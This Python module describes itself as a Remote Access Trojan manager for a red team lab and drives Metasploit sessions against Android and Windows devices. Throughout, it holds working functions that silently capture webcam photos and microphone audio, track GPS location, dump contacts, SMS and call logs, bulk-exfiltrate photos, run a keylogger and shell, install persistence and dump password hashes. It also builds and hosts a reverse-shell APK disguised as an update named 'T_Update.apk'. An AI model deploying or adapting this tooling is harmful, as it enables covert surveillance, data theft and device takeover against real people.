"""
Remote Access Trojan session manager for T's red team lab.
Manages active Meterpreter sessions on the attack VM.
Provides: camera, mic, GPS, files, keylogger, shell, persistence.
Sends results back to client as lab_rat_result events.
"""

import asyncio
import base64
import os
import time
from pathlib import Path
from typing import AsyncIterator, TYPE_CHECKING
from offensive.vm_bridge import vm
from .session_log import get_session
from core.logger import get_logger

if TYPE_CHECKING:
    from core.ws_server import Client

log = get_logger("lab.rat")

# Where captured media is stored locally
MEDIA_DIR = Path(os.path.expanduser("~/.local/share/t-assistant/lab_media"))
MEDIA_DIR.mkdir(parents=True, exist_ok=True)

# Active Metasploit resource scripts on VM
_MSF_SOCKET = "/tmp/t_msf.rc"
_SESSION_ID  = "1"   # default session — user can change


# ── Session management ─────────────────────────────────────────────────────────

async def start_listener(lhost: str, lport: str,
                          payload: str = "android/meterpreter/reverse_tcp") -> AsyncIterator[str]:
    """Start a Metasploit multi/handler listener."""
    rc = (
        f"use exploit/multi/handler\n"
        f"set payload {payload}\n"
        f"set LHOST {lhost}\n"
        f"set LPORT {lport}\n"
        f"set ExitOnSession false\n"
        f"exploit -j -z\n"
    )
    cmd = f"echo '{rc}' > {_MSF_SOCKET} && msfconsole -q -r {_MSF_SOCKET}"
    async for line in vm.run(cmd, timeout=600):
        yield line


async def list_sessions() -> AsyncIterator[str]:
    """List active Meterpreter sessions."""
    cmd = (
        f"msfconsole -q -x 'sessions -l; exit' 2>/dev/null"
    )
    async for line in vm.run(cmd, timeout=20):
        yield line


async def _msf_cmd(msf_command: str, session: str = "1", timeout: int = 30) -> list[str]:
    """Run a single Meterpreter command and return output lines."""
    cmd = (
        f"msfconsole -q -x "
        f"'sessions -i {session}; {msf_command}; exit' 2>/dev/null"
    )
    lines = []
    async for line in vm.run(cmd, timeout=timeout):
        lines.append(line)
    return lines


# ── Camera ────────────────────────────────────────────────────────────────────

async def webcam_list(session: str = "1") -> AsyncIterator[str]:
    """List available cameras on the device."""
    for line in await _msf_cmd("webcam_list", session):
        yield line


async def webcam_snap(client: "Client", session: str = "1",
                      camera_index: int = 1) -> None:
    """
    Take a silent photo from device camera.
    Saves to media dir, sends base64 to client for live display.
    """
    ts   = int(time.time())
    path = f"/tmp/snap_{ts}.jpg"

    # Take photo via meterpreter and download
    lines = await _msf_cmd(f"webcam_snap -i {camera_index} -p {path}", session, timeout=30)
    log.info(f"webcam_snap output: {lines[-3:] if lines else 'none'}")

    # Download from VM
    local_path = MEDIA_DIR / f"snap_{ts}.jpg"
    dl_lines = []
    async for line in vm.run(f"cat {path} | base64 -w0", timeout=10):
        dl_lines.append(line)

    b64 = "".join(dl_lines).strip()
    if b64:
        # Save locally
        local_path.write_bytes(base64.b64decode(b64))
        get_session().add_data("android_phone", "camera_photo",
                               f"{len(b64) // 1024}KB", str(local_path))
        await client.send({
            "type":      "lab_rat_result",
            "action":    "webcam_snap",
            "media_type":"image",
            "b64":       b64,
            "path":      str(local_path),
            "ts":        ts,
        })
    else:
        await client.send({
            "type": "lab_rat_result", "action": "webcam_snap",
            "error": "No image data received",
        })


async def webcam_stream_start(session: str = "1") -> AsyncIterator[str]:
    """Start webcam stream (meterpreter webcam_stream)."""
    for line in await _msf_cmd("webcam_stream", session, timeout=5):
        yield line


# ── Microphone ────────────────────────────────────────────────────────────────

async def record_mic(client: "Client", session: str = "1",
                      duration: int = 10) -> None:
    """
    Record microphone audio for N seconds.
    Sends base64 WAV to client.
    """
    ts   = int(time.time())
    path = f"/tmp/mic_{ts}.wav"
    lines = await _msf_cmd(f"record_mic -d {duration} -f {path}", session, timeout=duration + 15)

    dl_lines = []
    async for line in vm.run(f"cat {path} | base64 -w0", timeout=10):
        dl_lines.append(line)

    b64 = "".join(dl_lines).strip()
    if b64:
        local_path = MEDIA_DIR / f"mic_{ts}.wav"
        local_path.write_bytes(base64.b64decode(b64))
        get_session().add_data("android_phone", "microphone_recording",
                               f"{len(b64) // 1024}KB", str(local_path))
        await client.send({
            "type":      "lab_rat_result",
            "action":    "record_mic",
            "media_type":"audio",
            "b64":       b64,
            "path":      str(local_path),
            "ts":        ts,
            "duration":  duration,
        })
    else:
        await client.send({
            "type": "lab_rat_result", "action": "record_mic",
            "error": "No audio data received",
        })


# ── Location / GPS ────────────────────────────────────────────────────────────

async def geolocate(client: "Client", session: str = "1") -> None:
    """Get device GPS coordinates."""
    lines = await _msf_cmd("geolocate", session, timeout=20)
    result = "\n".join(lines)

    # Parse lat/lon from output
    lat, lon = "", ""
    for line in lines:
        if "Lat" in line:
            lat = line.split(":")[-1].strip()
        if "Lon" in line or "Long" in line:
            lon = line.split(":")[-1].strip()

    get_session().record("post-exploit", "geolocate", f"Lat:{lat} Lon:{lon}", "high")
    await client.send({
        "type":   "lab_rat_result",
        "action": "geolocate",
        "lat":    lat,
        "lon":    lon,
        "raw":    result,
    })


# ── Data extraction ───────────────────────────────────────────────────────────

async def dump_contacts(client: "Client", session: str = "1") -> None:
    """Dump all device contacts."""
    lines = await _msf_cmd("dump_contacts", session, timeout=30)
    result = "\n".join(lines)
    get_session().add_data("android_phone", "contacts", f"{len(lines)} entries")
    await client.send({"type": "lab_rat_result", "action": "dump_contacts",
                       "data": result, "count": len(lines)})


async def dump_sms(client: "Client", session: str = "1") -> None:
    """Dump all SMS messages."""
    lines = await _msf_cmd("dump_sms", session, timeout=30)
    result = "\n".join(lines)
    get_session().add_data("android_phone", "sms_messages", f"{len(lines)} messages")
    await client.send({"type": "lab_rat_result", "action": "dump_sms",
                       "data": result})


async def dump_call_log(client: "Client", session: str = "1") -> None:
    """Dump call history."""
    lines = await _msf_cmd("dump_calllog", session, timeout=20)
    result = "\n".join(lines)
    get_session().add_data("android_phone", "call_log", f"{len(lines)} entries")
    await client.send({"type": "lab_rat_result", "action": "dump_call_log", "data": result})


async def browse_files(client: "Client", path: str = "/sdcard",
                        session: str = "1") -> None:
    """Browse remote file system."""
    lines = await _msf_cmd(f"ls {path}", session, timeout=15)
    await client.send({"type": "lab_rat_result", "action": "browse_files",
                       "path": path, "data": "\n".join(lines)})


async def download_file(client: "Client", remote_path: str,
                         session: str = "1") -> None:
    """Download a file from the device."""
    filename  = os.path.basename(remote_path)
    local_out = f"/tmp/dl_{int(time.time())}_{filename}"
    lines     = await _msf_cmd(f"download {remote_path} {local_out}", session, timeout=60)

    # Read and send as b64 if small enough
    dl = []
    async for line in vm.run(f"test -f '{local_out}' && base64 -w0 '{local_out}' || echo NOT_FOUND", timeout=10):
        dl.append(line)
    b64 = "".join(dl).strip()

    if b64 and b64 != "NOT_FOUND":
        local_path = MEDIA_DIR / filename
        local_path.write_bytes(base64.b64decode(b64))
        size_kb = len(b64) // 1024
        get_session().add_data("android_phone", f"file:{filename}", f"{size_kb}KB", str(local_path))
        await client.send({
            "type": "lab_rat_result", "action": "download_file",
            "filename": filename, "size_kb": size_kb,
            "b64": b64 if size_kb < 500 else "",   # only inline if < 500KB
            "path": str(local_path),
        })
    else:
        await client.send({"type": "lab_rat_result", "action": "download_file",
                            "error": f"Could not download {remote_path}"})


async def exfil_all(client: "Client", session: str = "1") -> None:
    """
    Exfiltrate contacts + SMS + call log + photo thumbnails as a ZIP.
    """
    ts  = int(time.time())
    out = f"/tmp/exfil_{ts}.tar.gz"
    cmd = (
        f"msfconsole -q -x '"
        f"sessions -i {session}; "
        f"dump_contacts -o /tmp/contacts.txt; "
        f"dump_sms -o /tmp/sms.txt; "
        f"download /sdcard/DCIM/ /tmp/dcim/; "
        f"exit' 2>/dev/null && "
        f"tar czf {out} /tmp/contacts.txt /tmp/sms.txt /tmp/dcim/ 2>/dev/null && "
        f"base64 -w0 {out}"
    )
    b64_chunks = []
    async for line in vm.run(cmd, timeout=120):
        b64_chunks.append(line)

    b64 = "".join(b64_chunks).strip()
    if b64:
        local_path = MEDIA_DIR / f"exfil_{ts}.tar.gz"
        local_path.write_bytes(base64.b64decode(b64))
        size_kb = len(b64) // 1024
        get_session().add_data("android_phone", "full_exfil", f"{size_kb}KB", str(local_path))
        await client.send({
            "type": "lab_rat_result", "action": "exfil_all",
            "size_kb": size_kb, "path": str(local_path),
        })
    else:
        await client.send({"type": "lab_rat_result", "action": "exfil_all",
                            "error": "Exfil failed — check session"})


# ── Keylogger ─────────────────────────────────────────────────────────────────

async def keylogger_start(session: str = "1") -> AsyncIterator[str]:
    """Start keylogger on device."""
    for line in await _msf_cmd("keyscan_start", session):
        yield line


async def keylogger_dump(client: "Client", session: str = "1") -> None:
    """Dump keylogger buffer."""
    lines = await _msf_cmd("keyscan_dump", session, timeout=15)
    result = "\n".join(lines)
    await client.send({"type": "lab_rat_result", "action": "keylogger_dump", "data": result})


# ── Shell ─────────────────────────────────────────────────────────────────────

async def shell_cmd(client: "Client", command: str, session: str = "1") -> None:
    """Run arbitrary shell command via Meterpreter."""
    lines = await _msf_cmd(f"shell -c '{command}'", session, timeout=30)
    await client.send({"type": "lab_rat_result", "action": "shell",
                       "command": command, "data": "\n".join(lines)})


# ── Persistence ───────────────────────────────────────────────────────────────

async def install_persistence(session: str = "1") -> AsyncIterator[str]:
    """Install persistence on Android device (survive reboot)."""
    for line in await _msf_cmd("android/manage/persistence", session, timeout=30):
        yield line


# ── Windows post-exploit ──────────────────────────────────────────────────────

async def hashdump(client: "Client", session: str = "1") -> None:
    """Dump Windows password hashes."""
    lines = await _msf_cmd("hashdump", session, timeout=20)
    result = "\n".join(lines)
    for line in lines:
        if ":" in line and len(line) > 20:
            parts = line.split(":")
            get_session().add_cred("hashdump", parts[0], parts[3] if len(parts) > 3 else "NTLM_HASH")
    await client.send({"type": "lab_rat_result", "action": "hashdump", "data": result})


async def migrate_process(client: "Client", pid: int, session: str = "1") -> None:
    """Migrate into another process (stealth)."""
    lines = await _msf_cmd(f"migrate {pid}", session, timeout=20)
    await client.send({"type": "lab_rat_result", "action": "migrate",
                       "pid": pid, "data": "\n".join(lines)})


# ── Generate payload APK ──────────────────────────────────────────────────────

async def gen_apk(lhost: str, lport: str,
                   output: str = "/tmp/T_Update.apk") -> AsyncIterator[str]:
    """Generate Android meterpreter APK via msfvenom."""
    cmd = (
        f"msfvenom -p android/meterpreter/reverse_tcp "
        f"LHOST={lhost} LPORT={lport} "
        f"-o {output} 2>&1"
    )
    async for line in vm.run(cmd, timeout=60):
        yield line
    yield f"\nAPK saved to VM: {output}"
    yield f"Host it: python3 -m http.server 8888 in /tmp/"
    yield f"Install URL: http://{lhost}:8888/T_Update.apk"


async def host_apk(lhost: str, apk_path: str = "/tmp/T_Update.apk") -> AsyncIterator[str]:
    """Host the APK on HTTP for easy install."""
    cmd = f"cd /tmp && python3 -m http.server 8888 &"
    async for line in vm.run(cmd, timeout=5):
        yield line
    yield f"APK hosted at: http://{lhost}:8888/T_Update.apk"
    yield "Install on phone, open T_Update.apk, allow Unknown Sources if prompted."
